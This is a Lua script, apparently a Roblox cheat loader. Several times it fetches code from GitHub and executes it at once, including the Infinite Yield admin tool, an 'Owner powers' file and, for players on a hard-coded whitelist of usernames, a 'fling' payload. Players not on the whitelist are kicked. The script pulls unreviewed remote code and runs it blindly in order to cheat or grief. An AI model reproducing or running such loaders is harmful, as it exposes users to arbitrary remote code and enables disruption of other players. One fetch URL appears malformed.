local executed = false

if not executed then
    executed = true

    spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Owner%20powers"))()
    end)
    
    spawn(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/masterdjidjdd/source'))()
    end)

    spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/dkekmdldkd"))()
    end)
end

local whitelistedUsers = {
    "Alikhammas",  -- Your username
    "rxsan_75",   -- Add more usernames as needed
    "Ledorwas22",
    "Dubistecklig1",
    "kitler_264",
    "Robloxian74630436",
    "UnxableDev",
    "tfmfbf",
    "goekaycool",
    "SAMSEMI",
    "Hamudi_boss123",
    "c0i5n7e5r2c3b1",
    "indra_voicchat",
    "Ledorwas26",
    "Egeboss7575",
    "sebbaxetian",
    "sebaxetian"
}

local player = game.Players.LocalPlayer

wait(1) -- Add a short wait

print("Checking player: " .. player.Name) -- Debugging output

-- Normalize player name to avoid case sensitivity issues
local playerName = player.Name:lower()

-- Check if the player is in the whitelist
local isWhitelisted = false
for _, username in ipairs(whitelistedUsers) do
    if username:lower() == playerName then
        isWhitelisted = true
        break
    end
end

if isWhitelisted then
    -- Send notification to the player
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Access Granted",
        Text = "You are authorized to run this script.",
        Duration = 5
    })

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Micupfling"))()
else
    print("Player not whitelisted. Kicking: " .. player.Name) -- Debugging output
    player:Kick("You are not authorized to execute this script.")
end
